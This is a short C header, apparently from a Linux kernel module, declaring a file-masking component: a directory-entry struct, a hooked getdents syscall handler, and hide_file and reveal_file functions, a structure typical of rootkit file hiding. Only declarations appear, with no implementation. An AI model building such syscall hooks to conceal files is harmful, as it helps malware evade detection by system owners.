#ifndef __FILE_MASKING__
#define __FILE_MASKING__


struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

void file_masking_init(int, void *);
void file_masking_exit(void);

asmlinkage int file_masking_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count, int ret);

int hide_file(char *);
int reveal_file(char *);

#endif
